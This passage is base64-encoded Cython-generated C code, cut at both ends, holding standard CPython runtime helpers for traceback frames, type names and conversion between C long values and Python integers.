UNvZGVPYmplY3RGb3JUcmFjZWJhY2soCiAgICAgICAgICAgIGZ1bmNuYW1lLCBjX2xpbmUsIHB5X2xpbmUsIGZpbGVuYW1lKTsKICAgICAgICBpZiAoIXB5X2NvZGUpIHsKICAgICAgICAgICAgCiAgICAgICAgICAgIFB5X1hERUNSRUYocHR5cGUpOwogICAgICAgICAgICBQeV9YREVDUkVGKHB2YWx1ZSk7CiAgICAgICAgICAgIFB5X1hERUNSRUYocHRyYWNlYmFjayk7CiAgICAgICAgICAgIGdvdG8gYmFkOwogICAgICAgIH0KICAgICAgICBfX1B5eF9FcnJSZXN0b3JlSW5TdGF0ZSh0c3RhdGUsIHB0eXBlLCBwdmFsdWUsIHB0cmFjZWJhY2spOwogICAgICAgIF9fcHl4X2luc2VydF9jb2RlX29iamVjdChjX2xpbmUgPyAtY19saW5lIDogcHlfbGluZSwgcHlfY29kZSk7CiAgICB9CiAgICBweV9mcmFtZSA9IFB5RnJhbWVfTmV3KAogICAgICAgIHRzdGF0ZSwgICAgICAgICAgICAKICAgICAgICBweV9jb2RlLCAgICAgICAgICAgCiAgICAgICAgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfZCwgICAgCiAgICAgICAgMCAgICAgICAgICAgICAgICAgIAogICAgKTsKICAgIGlmICghcHlfZnJhbWUpIGdvdG8gYmFkOwogICAgX19QeXhfUHlGcmFtZV9TZXRMaW5lTnVtYmVyKHB5X2ZyYW1lLCBweV9saW5lKTsKICAgIFB5VHJhY2VCYWNrX0hlcmUocHlfZnJhbWUpOwpiYWQ6CiAgICBQeV9YREVDUkVGKHB5X2NvZGUpOwogICAgUHlfWERFQ1JFRihweV9mcmFtZSk7Cn0KI2VuZGlmCgoKc3RhdGljIENZVEhPTl9JTkxJTkUgUHlPYmplY3QqIF9fUHl4X1B5TG9uZ19Gcm9tX2xvbmcobG9uZyB2YWx1ZSkgewojaWZkZWYgX19QeXhfSEFTX0dDQ19ESUFHTk9TVElDCiNwcmFnbWEgR0NDIGRpYWdub3N0aWMgcHVzaAojcHJhZ21hIEdDQyBkaWFnbm9zdGljIGlnbm9yZWQgIi1XY29udmVyc2lvbiIKI2VuZGlmCiAgICBjb25zdCBsb25nIG5lZ19vbmUgPSAobG9uZykgLTEsIGNvbnN0X3plcm8gPSAobG9uZykgMDsKI2lmZGVmIF9fUHl4X0hBU19HQ0NfRElBR05PU1RJQwojcHJhZ21hIEdDQyBkaWFnbm9zdGljIHBvcAojZW5kaWYKICAgIGNvbnN0IGludCBpc191bnNpZ25lZCA9IG5lZ19vbmUgPiBjb25zdF96ZXJvOwogICAgaWYgKGlzX3Vuc2lnbmVkKSB7CiAgICAgICAgaWYgKHNpemVvZihsb25nKSA8IHNpemVvZihsb25nKSkgewogICAgICAgICAgICByZXR1cm4gUHlMb25nX0Zyb21Mb25nKChsb25nKSB2YWx1ZSk7CiAgICAgICAgfSBlbHNlIGlmIChzaXplb2YobG9uZykgPD0gc2l6ZW9mKHVuc2lnbmVkIGxvbmcpKSB7CiAgICAgICAgICAgIHJldHVybiBQeUxvbmdfRnJvbVVuc2lnbmVkTG9uZygodW5zaWduZWQgbG9uZykgdmFsdWUpOwojaWYgZGVmaW5lZChIQVZFX0xPTkdfTE9ORykgJiYgIUNZVEhPTl9DT01QSUxJTkdfSU5fUFlQWQogICAgICAgIH0gZWxzZSBpZiAoc2l6ZW9mKGxvbmcpIDw9IHNpemVvZih1bnNpZ25lZCBQWV9MT05HX0xPTkcpKSB7CiAgICAgICAgICAgIHJldHVybiBQeUxvbmdfRnJvbVVuc2lnbmVkTG9uZ0xvbmcoKHVuc2lnbmVkIFBZX0xPTkdfTE9ORykgdmFsdWUpOwojZW5kaWYKICAgICAgICB9CiAgICB9IGVsc2UgewogICAgICAgIGlmIChzaXplb2YobG9uZykgPD0gc2l6ZW9mKGxvbmcpKSB7CiAgICAgICAgICAgIHJldHVybiBQeUxvbmdfRnJvbUxvbmcoKGxvbmcpIHZhbHVlKTsKI2lmZGVmIEhBVkVfTE9OR19MT05HCiAgICAgICAgfSBlbHNlIGlmIChzaXplb2YobG9uZykgPD0gc2l6ZW9mKFBZX0xPTkdfTE9ORykpIHsKICAgICAgICAgICAgcmV0dXJuIFB5TG9uZ19Gcm9tTG9uZ0xvbmcoKFBZX0xPTkdfTE9ORykgdmFsdWUpOwojZW5kaWYKICAgICAgICB9CiAgICB9CiAgICB7CiAgICAgICAgdW5zaWduZWQgY2hhciAqYnl0ZXMgPSAodW5zaWduZWQgY2hhciAqKSZ2YWx1ZTsKI2lmICFDWVRIT05fQ09NUElMSU5HX0lOX0xJTUlURURfQVBJICYmIFBZX1ZFUlNJT05fSEVYID49IDB4MDMwZDAwQTQKICAgICAgICBpZiAoaXNfdW5zaWduZWQpIHsKICAgICAgICAgICAgcmV0dXJuIFB5TG9uZ19Gcm9tVW5zaWduZWROYXRpdmVCeXRlcyhieXRlcywgc2l6ZW9mKHZhbHVlKSwgLTEpOwogICAgICAgIH0gZWxzZSB7CiAgICAgICAgICAgIHJldHVybiBQeUxvbmdfRnJvbU5hdGl2ZUJ5dGVzKGJ5dGVzLCBzaXplb2YodmFsdWUpLCAtMSk7CiAgICAgICAgfQojZWxpZiAhQ1lUSE9OX0NPTVBJTElOR19JTl9MSU1JVEVEX0FQSSAmJiBQWV9WRVJTSU9OX0hFWCA8IDB4MDMwZDAwMDAKICAgICAgICBpbnQgb25lID0gMTsgaW50IGxpdHRsZSA9IChpbnQpKih1bnNpZ25lZCBjaGFyICopJm9uZTsKICAgICAgICByZXR1cm4gX1B5TG9uZ19Gcm9tQnl0ZUFycmF5KGJ5dGVzLCBzaXplb2YobG9uZyksCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBsaXR0bGUsICFpc191bnNpZ25lZCk7CiNlbHNlCiAgICAgICAgaW50IG9uZSA9IDE7IGludCBsaXR0bGUgPSAoaW50KSoodW5zaWduZWQgY2hhciAqKSZvbmU7CiAgICAgICAgUHlPYmplY3QgKmZyb21fYnl0ZXMsICpyZXN1bHQgPSBOVUxMLCAqa3dkcyA9IE5VTEw7CiAgICAgICAgUHlPYmplY3QgKnB5X2J5dGVzID0gTlVMTCwgKm9yZGVyX3N0ciA9IE5VTEw7CiAgICAgICAgZnJvbV9ieXRlcyA9IFB5T2JqZWN0X0dldEF0dHJTdHJpbmcoKFB5T2JqZWN0KikmUHlMb25nX1R5cGUsICJmcm9tX2J5dGVzIik7CiAgICAgICAgaWYgKCFmcm9tX2J5dGVzKSByZXR1cm4gTlVMTDsKICAgICAgICBweV9ieXRlcyA9IFB5Qnl0ZXNfRnJvbVN0cmluZ0FuZFNpemUoKGNoYXIqKWJ5dGVzLCBzaXplb2YobG9uZykpOwogICAgICAgIGlmICghcHlfYnl0ZXMpIGdvdG8gbGltaXRlZF9iYWQ7CiAgICAgICAgb3JkZXJfc3RyID0gUHlVbmljb2RlX0Zyb21TdHJpbmcobGl0dGxlID8gImxpdHRsZSIgOiAiYmlnIik7CiAgICAgICAgaWYgKCFvcmRlcl9zdHIpIGdvdG8gbGltaXRlZF9iYWQ7CiAgICAgICAgewogICAgICAgICAgICBQeU9iamVjdCAqYXJnc1szKyhDWVRIT05fVkVDVE9SQ0FMTCA/IDEgOiAwKV0gPSB7IE5VTEwsIHB5X2J5dGVzLCBvcmRlcl9zdHIgfTsKICAgICAgICAgICAgaWYgKCFpc191bnNpZ25lZCkgewogICAgICAgICAgICAgICAga3dkcyA9IF9fUHl4X01ha2VWZWN0b3JjYWxsQnVpbGRlckt3ZHMoMSk7CiAgICAgICAgICAgICAgICBpZiAoIWt3ZHMpIGdvdG8gbGltaXRlZF9iYWQ7CiAgICAgICAgICAgICAgICBpZiAoX19QeXhfVmVjdG9yY2FsbEJ1aWxkZXJfQWRkQXJnU3RyKCJzaWduZWQiLCBfX1B5eF9OZXdSZWYoUHlfVHJ1ZSksIGt3ZHMsIGFyZ3MrMywgMCkgPCAwKSBnb3RvIGxpbWl0ZWRfYmFkOwogICAgICAgICAgICB9CiAgICAgICAgICAgIHJlc3VsdCA9IF9fUHl4X09iamVjdF9WZWN0b3JjYWxsX0NhbGxGcm9tQnVpbGRlcihmcm9tX2J5dGVzLCBhcmdzKzEsIDIgfCBfX1B5eF9QWV9WRUNUT1JDQUxMX0FSR1VNRU5UU19PRkZTRVQsIGt3ZHMpOwogICAgICAgIH0KICAgICAgICBsaW1pdGVkX2JhZDoKICAgICAgICBQeV9YREVDUkVGKGt3ZHMpOwogICAgICAgIFB5X1hERUNSRUYob3JkZXJfc3RyKTsKICAgICAgICBQeV9YREVDUkVGKHB5X2J5dGVzKTsKICAgICAgICBQeV9YREVDUkVGKGZyb21fYnl0ZXMpOwogICAgICAgIHJldHVybiByZXN1bHQ7CiNlbmRpZgogICAgfQp9CgoKI2lmIENZVEhPTl9DT01QSUxJTkdfSU5fTElNSVRFRF9BUEkgJiYgX19QWVhfTElNSVRFRF9WRVJTSU9OX0hFWCA8IDB4MDMwZDAwMDAKc3RhdGljIF9fUHl4X1R5cGVOYW1lCl9fUHl4X1B5VHlwZV9HZXRGdWxseVF1YWxpZmllZE5hbWUoUHlUeXBlT2JqZWN0KiB0cCkKewogICAgUHlPYmplY3QgKm1vZHVsZSA9IE5VTEwsICpuYW1lID0gTlVMTCwgKnJlc3VsdCA9IE5VTEw7CiAgICAjaWYgX19QWVhfTElNSVRFRF9WRVJTSU9OX0hFWCA8IDB4MDMwYjAwMDAKICAgIG5hbWUgPSBfX1B5eF9QeU9iamVjdF9HZXRBdHRyU3RyKChQeU9iamVjdCAqKXRwLAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X25fdV9xdWFsbmFtZSk7CiAgICAjZWxzZQogICAgbmFtZSA9IFB5VHlwZV9HZXRRdWFsTmFtZSh0cCk7CiAgICAjZW5kaWYKICAgIGlmICh1bmxpa2VseShuYW1lID09IE5VTEwpIHx8IHVubGlrZWx5KCFQeVVuaWNvZGVfQ2hlY2sobmFtZSkpKSBnb3RvIGJhZDsKICAgIG1vZHVsZSA9IF9fUHl4X1B5T2JqZWN0X0dldEF0dHJTdHIoKFB5T2JqZWN0ICopdHAsCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfbl91X21vZHVsZSk7CiAgICBpZiAodW5saWtlbHkobW9kdWxlID09IE5VTEwpIHx8IHVubGlrZWx5KCFQeVVuaWNvZGVfQ2hlY2sobW9kdWxlKSkpIGdvdG8gYmFkOwogICAgaWYgKFB5VW5pY29kZV9Db21wYXJlV2l0aEFTQ0lJU3RyaW5nKG1vZHVsZSwgImJ1aWx0aW5zIikgPT0gMCkgewogICAgICAgIHJlc3VsdCA9IG5hbWU7CiAgICAgICAgbmFtZSA9IE5VTEw7CiAgICAgICAgZ290byBkb25lOwogICAgfQogICAgcmVzdWx0ID0gUHlVbmljb2RlX0Zyb21Gb3JtYXQoIiVVLiVVIiwgbW9kdWxlLCBuYW1lKTsKICAgIGlmICh1bmxpa2VseShyZXN1bHQgPT0gTlVMTCkpIGdvdG8gYmFkOwogIGRvbmU6CiAgICBQeV9YREVDUkVGKG5hbWUpOwogICAgUHlfWERFQ1JFRihtb2R1bGUpOwogICAgcmV0dXJuIHJlc3VsdDsKICBiYWQ6CiAgICBQeUVycl9DbGVhcigpOwogICAgaWYgKG5hbWUpIHsKICAgICAgICByZXN1bHQgPSBuYW1lOwogICAgICAgIG5hbWUgPSBOVUxMOwogICAgfSBlbHNlIHsKICAgICAgICByZXN1bHQgPSBfX1B5eF9OZXdSZWYoX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfa3BfdV9fMjYpOwogICAgfQogICAgZ290byBkb25lOwp9CiNlbmRpZgoKCiNkZWZpbmUgX19QWVhfVkVSSUZZX1JFVFVSTl9JTlQodGFyZ2V0X3R5cGUsIGZ1bmNfdHlwZSwgZnVuY192YWx1ZSlcCiAgICBfX1BZWF9fVkVSSUZZX1JFVFVSTl9JTlQodGFyZ2V0X3R5cGUsIGZ1bmNfdHlwZSwgZnVuY192YWx1ZSwgMCkKI2RlZmluZSBfX1BZWF9WRVJJRllfUkVUVVJOX0lOVF9FWEModGFyZ2V0X3R5cGUsIGZ1bmNfdHlwZSwgZnVuY192YWx1ZSlcCiAgICBfX1BZWF9fVkVSSUZZX1JFVFVSTl9JTlQodGFyZ2V0X3R5cGUsIGZ1bmNfdHlwZSwgZnVuY192YWx1ZSwgMSkKI2RlZmluZSBfX1BZWF9fVkVSSUZZX1JFVFVSTl9JTlQodGFyZ2V0X3R5cGUsIGZ1bmNfdHlwZSwgZnVuY192YWx1ZSwgZXhjKVwKICAgIHtcCiAgICAgICAgZnVuY190eXBlIHZhbHVlID0gZnVuY192YWx1ZTtcCiAgICAgICAgaWYgKHNpemVvZih0YXJnZXRfdHlwZSkgPCBzaXplb2YoZnVuY190eXBlKSkge1wKICAgICAgICAgICAgaWYgKHVubGlrZWx5KHZhbHVlICE9IChmdW5jX3R5cGUpICh0YXJnZXRfdHlwZSkgdmFsdWUpKSB7XAogICAgICAgICAgICAgICAgZnVuY190eXBlIHplcm8gPSAwO1wKICAgICAgICAgICAgICAgIGlmIChleGMgJiYgdW5saWtlbHkodmFsdWUgPT0gKGZ1bmNfdHlwZSktMSAmJiBQeUVycl9PY2N1cnJlZCgpKSlcCiAgICAgICAgICAgICAgICAgICAgcmV0dXJuICh0YXJnZXRfdHlwZSkgLTE7XAogICAgICAgICAgICAgICAgaWYgKGlzX3Vuc2lnbmVkICYmIHVubGlrZWx5KHZhbHVlIDwgemVybykpXAogICAgICAgICAgICAgICAgICAgIGdvdG8gcmFpc2VfbmVnX292ZXJmbG93O1wKICAgICAgICAgICAgICAgIGVsc2VcCiAgICAgICAgICAgICAgICAgICAgZ290byByYWlzZV9vdmVyZmxvdztcCiAgICAgICAgICAgIH1cCiAgICAgICAgfVwKICAgICAgICByZXR1cm4gKHRhcmdldF90eXBlKSB2YWx1ZTtcCiAgICB9CgoKc3RhdGljIENZVEhPTl9JTkxJTkUgbG9uZyBfX1B5eF9QeUxvbmdfQXNfbG9uZyhQeU9iamVjdCAqeCkgewojaWZkZWYgX19QeXhfSEFTX0dDQ19ESUFHTk9TVElDCiNwcmFnbWEgR0NDIGRpYWdub3N0aWMgcHVzaAojcHJhZ21hIEdDQyBkaWFnbm9zdGljIGlnbm9yZWQgIi1XY29udmVyc2lvbiIKI2VuZGlmCiAgICBjb25zdCBsb25nIG5lZ19vbmUgPSAobG9uZykgLTEsIGNvbnN0X3plcm8gPSAobG9uZykgMDsKI2lmZGVmIF9fUHl4X0hBU19HQ0NfRElBR05PU1RJQwojcHJhZ21hIEdDQyBkaWFnbm9zdGljIHBvcAojZW5kaWYKICAgIGNvbnN0IGludCBpc191bnNpZ25lZCA9IG5lZ19vbmUgPiBjb25zdF96ZXJvOwogICAgaWYgKHVubGlrZWx5KCFQeUxvbmdfQ2hlY2soeCkpKSB7CiAgICAgICAgbG9uZyB2YWw7CiAgICAgICAgUHlPYmplY3QgKnRtcCA9IF9fUHl4X1B5TnVtYmVyX0xvbmcoeCk7CiAgICAgICAgaWYgKCF0bXApIHJldHVybiAobG9uZykgLTE7CiAgICAgICAgdmFsID0gX19QeXhfUHlMb25nX0FzX2xvbmcodG1wKTsKICAgICAgICBQeV9ERUNSRUYodG1wKTsKICAgICAgICByZXR1cm4gdmFsOwogICAgfQogICAgaWYgKGlzX3Vuc2lnbmVkKSB7CiNpZiBDWVRIT05fVVNFX1BZTE9OR19JTlRFUk5BTFMKICAgICAgICBpZiAodW5saWtlbHkoX19QeXhfUHlMb25nX0lzTmVnKHgpKSkgewogICAgICAgICAgICBnb3RvIHJhaXNlX25lZ19vdmVyZmxvdzsKICAgICAgICB9IGVsc2UgaWYgKF9fUHl4X1B5TG9uZ19Jc0NvbXBhY3QoeCkpIHsKICAgICAgICAgICAgX19QWVhfVkVSSUZZX1JFVFVSTl9JTlQobG9uZywgX19QeXhfY29tcGFjdF91cHlsb25nLCBfX1B5eF9QeUxvbmdfQ29tcGFjdFZhbHVlVW5zaWduZWQoeCkpCiAgICAgICAgfSBlbHNlIHsKICAgICAgICAgICAgY29uc3QgZGlnaXQqIGRpZ2l0cyA9IF9fUHl4X1B5TG9uZ19EaWdpdHMoeCk7CiAgICAgICAgICAgIGFzc2VydChfX1B5eF9QeUxvbmdfRGlnaXRDb3VudCh4KSA+IDEpOwogICAgICAgICAgICBzd2l0Y2ggKF9fUHl4X1B5TG9uZ19EaWdpdENvdW50KHgpKSB7CiAgICAgICAgICAgICAgICBjYXNlIDI6CiAgICAgICAgICAgICAgICAgICAgaWYgKCg4ICogc2l6ZW9mKGxvbmcpID4gMSAqIFB5TG9uZ19TSElGVCkpIHsKICAgICAgICAgICAgICAgICAgICAgICAgaWYgKCg4ICogc2l6ZW9mKHVuc2lnbmVkIGxvbmcpID4gMiAqIFB5TG9uZ19TSElGVCkpIHsKICAgICAgICAgICAgICAgICAgICAgICAgICAgIF9fUFlYX1ZFUklGWV9SRVRVUk5fSU5UKGxvbmcsIHVuc2lnbmVkIGxvbmcsICgoKCgodW5zaWduZWQgbG9uZylkaWdpdHNbMV0pIDw8IFB5TG9uZ19TSElGVCkgfCAodW5zaWduZWQgbG9uZylkaWdpdHNbMF0pKSkKICAgICAgICAgICAgICAgICAgICAgICAgfSBlbHNlIGlmICgoOCAqIHNpemVvZihsb25nKSA+PSAyICogUHlMb25nX1NISUZUKSkgewogICAgICAgICAgICAgICAgICAgICAgICAgICAgcmV0dXJuIChsb25nKSAoKCgoKGxvbmcpZGlnaXRzWzFdKSA8PCBQeUxvbmdfU0hJRlQpIHwgKGxvbmcpZGlnaXRzWzBdKSk7CiAgICAgICAgICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICAgICAgYnJlYWs7CiAgICAgICAgICAgICAgICBjYXNlIDM6CiAgICAgICAgICAgICAgICAgICAgaWYgKCg4ICogc2l6ZW9mKGxvbmcpID4gMiAqIFB5TG9uZ19TSElGVCkpIHsKICAgICAgICAgICAgICAgICAgICAgICAgaWYgKCg4ICogc2l6ZW9mKHVuc2lnbmVkIGxvbmcpID4gMyAqIFB5TG9uZ19TSElGVCkpIHsKICAgICAgICAgICAgICAgICAgICAgICAgICAgIF9fUFlYX1ZFUklGWV9SRVRVUk5fSU5UKGxvbmcsIHVuc2lnbmVkIGxvbmcsICgoKCgoKCh1bnNpZ25lZCBsb25nKWRpZ2l0c1syXSkgPDwgUHlMb25nX1NISUZUKSB8ICh1bnNpZ25lZCBsb25nKWRpZ2l0c1sxXSkgPDwgUHlMb25nX1NISUZUKSB8ICh1bnNpZ25lZCBsb25nKWRpZ2l0c1swXSkpKQogICAgICAgICAgICAgICAgICAgICAgICB9IGVsc2UgaWYgKCg4ICogc2l6ZW9mKGxvbmcpID49IDMgKiBQeUxvbmdfU0hJRlQpKSB7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICByZXR1cm4gKGxvbmcpICgoKCgoKChsb25nKWRpZ2l0c1syXSkgPDwgUHlMb25nX1NISUZUKSB8IChsb25nKWRpZ2l0c1sxXSkgPDwgUHlMb25nX1NISUZUKSB8IChsb25nKWRpZ2l0c1swXSkpOwogICAgICAgICAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgICAgIGJyZWFrOwogICAgICAgICAgICAgICAgY2FzZSA0OgogICAgICAgICAgICAgICAgICAgIGlmICgoOCAqIHNpemVvZihsb25nKSA+IDMgKiBQeUxvbmdfU0hJRlQpKSB7CiAgICAgICAgICAgICAgICAgICAgICAgIGlmICgoOCAqIHNpemVvZih1bnNpZ25lZCBsb25nKSA+IDQgKiBQeUxvbmdfU0hJRlQpKSB7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICBfX1BZWF9WRVJJRllfUkVUVVJOX0lOVChsb25nLCB1bnNpZ25lZCBsb25nLCAoKCgoKCgoKCh1bnNpZ25lZCBsb25nKWRpZ2l0c1szXSkgPDwgUHlMb25nX1NISUZUKSB8ICh1bnNpZ25lZCBsb25nKWRpZ2l0c1syXSkgPDwgUHlMb25nX1NISUZUKSB8ICh1bnNpZ25lZCBsb25nKWRpZ2l0c1sxXSkgPDwgUHlMb25nX1NISUZUKSB8ICh1bnNpZ25lZCBsb25nKWRpZ2l0c1swXSkpKQogICAgICAgICAgICAgICAgICAgICAgICB9IGVsc2UgaWYgKCg4ICogc2l6ZW9mKGxvbmcpID49IDQgKiBQeUxvbmdfU0hJRlQpKSB7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICByZXR1cm4gKGxvbmcpICgoKCgoKCgoKGxvbmcpZGlnaXRzWzNdKSA8PCBQeUxvbmdfU0hJRlQpIHwgKGxvbmcpZGlnaXRzWzJdKSA8PCBQeUxvbmdfU0hJRlQpIHwgKGxvbmcpZGlnaXRzWzFdKSA8PCBQeUxvbmdfU0hJRlQpIHwgKGxvbmcpZGlnaXRzWzBdKSk7CiAgICAgICAgICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICAgICAgYnJlYWs7CiAgICAgICAgICAgIH0KICAgICAgICB9CiNlbmRpZgojaWYgQ1lUSE9OX0NPTVBJTElOR19JTl9DUFlUSE9OICYmIFBZX1ZFUlNJT05fSEVYIDwgMHgwMzBDMDBBNwogICAgICAgIGlmICh1bmxpa2VseShQeV9TSVpFKHgpIDwgMCkpIHsKICAgICAgICAgICAgZ290byByYWlzZV9uZWdfb3ZlcmZsb3c7CiAgICAgICAgfQojZWxzZQogICAgICAgIHsKICAgICAgICAgICAgaW50IHJlc3VsdCA9IFB5T2JqZWN0X1JpY2hDb21wYXJlQm9vbCh4LCBQeV9GYWxzZSwgUHlfTFQpOwogICAgICAgICAgICBpZiAodW5saWtlbHkocmVzdWx0IDwgMCkpCiAgICAgICAgICAgICAgICByZXR1cm4gKGxvbmcpIC0xOwogICAgICAgICAgICBpZiAodW5saWtlbHkocmVzdWx0ID09IDEpKQogICAgICAgICAgICAgICAgZ290byByYWlzZV9uZWdfb3ZlcmZsb3c7CiAgICAgICAgfQojZW5kaWYKICAgICAgICBpZiAoKHNpemVvZihsb25nKSA8PSBzaXplb2YodW5zaWduZWQgbG9uZykpKSB7CiAgICAgICAgICAgIF9fUFlYX1ZFUklGWV9SRVRVUk5fSU5UX0VYQyhsb25nLCB1bnNpZ25lZCBsb25nLCBQeUxvbmdfQXNVbnNpZ25lZExvbmcoeCkpCiNpZmRlZiBIQVZFX0xPTkdfTE9ORwogICAgICAgIH0gZWxzZSBpZiAoKHNpemVvZihsb25nKSA8PSBzaXplb2YodW5zaWduZWQgUFlfTE9OR19MT05HKSkpIHsKICAgICAgICAgICAgX19QWVhfVkVSSUZZX1JFVFVSTl9JTlRfRVhDKGxvbmcsIHVuc2lnbmVkIFBZX0xPTkdfTE9ORywgUHlMb25nX0FzVW5zaWduZWRMb25nTG9uZyh4KSkKI2VuZGlmCiAgICAgICAgfQogICAgfSBlbHNlIHsKI2lmIENZVEhPTl9VU0VfUFlMT05HX0lOVEVSTkFMUwogICAgICAgIGlmIChfX1B5eF9QeUxvbmdfSXNDb21wYWN0KHgpKSB7CiAgICAgICAgICAgIF9fUFlYX1ZFUklGWV9SRVRVUk5fSU5UKGxvbmcsIF9fUHl4X2NvbXBhY3RfcHlsb25nLCBfX1B5eF9QeUxvbmdfQ29tcGFjdFZhbHVlKHgpKQogICAgICAgIH0gZWxzZSB7CiAgICAgICAgICAgIGNvbnN0IGRpZ2l0KiBkaWdpdHMgPSBfX1B5eF9QeUxvbmdfRGlnaXRzKHgpOwogICAgICAgICAgICBhc3NlcnQoX19QeXhfUHlMb25nX0RpZ2l0Q291bnQoeCkgPiAxKTsKICAgICAgICAgICAgc3dpdGNoIChfX1B5eF9QeUxvbmdfU2lnbmVkRGlnaXRDb3VudCh4KSkgewogICAgICAgICAgICAgICAgY2FzZSAtMjoKICAgICAgICAgICAgICAgICAgICBpZiAoKDggKiBzaXplb2YobG9uZykgLSAxID4gMSAqIFB5TG9uZ19TSElGVCkpIHsKICAgICAgICAgICAgICAgICAgICAgICAgaWYgKCg4ICogc2l6ZW9mKHVuc2lnbmVkIGxvbmcpID4gMiAqIFB5TG9uZ19TSElGVCkpIHsKICAgICAgICAgICAgICAgICAgICAgICAgICAgIF9fUFlYX1ZFUklGWV9SRVRVUk5fSU5UKGxvbmcsIGxvbmcsIC0obG9uZykgKCgoKCh1bnNpZ25lZCBsb25nKWRpZ2l0c1sxXSkgPDwgUHlMb25nX1NISUZUKSB8ICh1bnNpZ25lZCBsb25nKWRpZ2l0c1swXSkpKQogICAgICAgICAgICAgICAgICAgICAgICB9IGVsc2UgaWYgKCg4ICogc2l6ZW9mKGxvbmcpIC0gMSA+IDIgKiBQeUxvbmdfU0hJRlQpKSB7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICByZXR1cm4gKGxvbmcpICgoKGxvbmcpLTEpKigoKCgobG9uZylkaWdpdHNbMV0pIDw8IFB5TG9uZ19TSElGVCkgfCAobG9uZylkaWdpdHNbMF0pKSk7CiAgICAgICAgICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICAgICAgYnJlYWs7CiAgICAgICAgICAgICAgICBjYXNlIDI6CiAgICAgICAgICAgICAgICAgICAgaWYgKCg4ICogc2l6ZW9mKGxvbmcpID4gMSAqIFB5TG9uZ19TSElGVCkpIHsKICAgICAgICAgICAgICAgICAgICAgICAgaWYgKCg4ICogc2l6ZW9mKHVuc2lnbmVkIGxvbmcpID4gMiAqIFB5TG9uZ19TSElGVCkpIHsKICAgICAgICAgICAgICAgICAgICAgICAgICAgIF9fUFlYX1ZFUklGWV9SRVRVUk5fSU5UKGxvbmcsIHVuc2lnbmVkIGxvbmcsICgoKCgodW5zaWduZWQgbG9uZylkaWdpdHNbMV0pIDw8IFB5TG9uZ19TSElGVCkgfCAodW5zaWduZWQgbG9uZylkaWdpdHNbMF0pKSkKICAgICAgICAgICAgICAgICAgICAgICAgfSBlbHNlIGlmICgoOCAqIHNpemVvZihsb25nKSAtIDEgPiAyICogUHlMb25nX1NISUZUKSkgewogICAgICAgICAgICAgICAgICAgICAgICAgICAgcmV0dXJuIChsb25nKSAoKCgoKChsb25nKWRpZ2l0c1sxXSkgPDwgUHlMb25nX1NISUZUKSB8IChsb25nKWRpZ2l0c1swXSkpKTsKICAgICAgICAgICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgICAgICBicmVhazsKICAgICAgICAgICAgICAgIGNhc2UgLTM6CiAgICAgICAgICAgICAgICAgICAgaWYgKCg4ICogc2l6ZW9mKGxvbmcpIC0gMSA+IDIgKiBQeUxvbmdfU0hJRlQpKSB7CiAgICAgICAgICAgICAgICAgICAgICAgIGlmICgoOCAqIHNpemVvZih1bnNpZ25lZCBsb25nKSA+IDMgKiBQeUxvbmdfU0hJRlQpKSB7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICBfX1BZWF9WRVJJRllfUkVUVVJOX0lOVChsb25nLCBsb25nLCAtKGxvbmcpICgoKCgoKCh1bnNpZ25lZCBsb25nKWRpZ2l0c1syXSkgPDwgUHlMb25nX1NISUZUKSB8ICh1bnNpZ25lZCBsb25nKWRpZ2l0c1sxXSkgPDwgUHlMb25nX1NISUZUKSB8ICh1bnNpZ25lZCBsb25nKWRpZ2l0c1swXSkpKQogICAgICAgICAgICAgICAgICAgICAgICB9IGVsc2UgaWYgKCg4ICogc2l6ZW9mKGxvbmcpIC0gMSA+IDMgKiBQeUxvbmdfU0hJRlQpKSB7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICByZXR1cm4gKGxvbmcpICgoKGxvbmcpLTEpKigoKCgoKChsb25nKWRpZ2l0c1syXSkgPDwgUHlMb25nX1NISUZUKSB8IChsb25nKWRpZ2l0c1sxXSkgPDwgUHlMb25nX1NISUZUKSB8IChsb25nKWRpZ2l0c1swXSkpKTsKICAgICAgICAgICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgICAgICBicmVhazsKICAgICAgICAgICAgICAgIGNhc2UgMzoKICAgICAgICAgICAgICAgICAgICBpZiAoKDggKiBzaXplb2YobG9uZykgPiAyICogUHlMb25nX1NISUZUKSkgewogICAgICAgICAgICAgICAgICAgICAgICBpZiAoKDggKiBzaXplb2YodW5zaWduZWQgbG9uZykgPiAzICogUHlMb25nX1NISUZUKSkgewogICAgICAgICAgICAgICAgICAgICAgICAgICAgX19QWVhfVkVSSUZZX1JFVFVSTl9JTlQobG9uZywgdW5zaWduZWQgbG9uZywgKCgoKCgoKHVuc2lnbmVkIGxvbmcpZGlnaXRzWzJdKSA8PCBQeUxvbmdfU0hJRlQpIHwgKHVuc2lnbmVkIGxvbmcpZGlnaXRzWzFdKSA8PCBQeUxvbmdfU0hJRlQpIHwgKHVuc2lnbmVkIGxvbmcpZGlnaXRzWzBdKSkpCiAgICAgICAgICAgICAgICAgICAgICAgIH0gZWxzZSBpZiAoKDggKiBzaXplb2YobG9uZykgLSAxID4gMyAqIFB5TG9uZ19TSElGVCkpIHsKICAgICAgICAgICAgICAgICAgICAgICAgICAgIHJldHVybiAobG9uZykgKCgoKCgoKChsb25nKWRpZ2l0c1syXSkgPDwgUHlMb25nX1NISUZUKSB8IChsb25nKWRpZ2l0c1sxXSkgP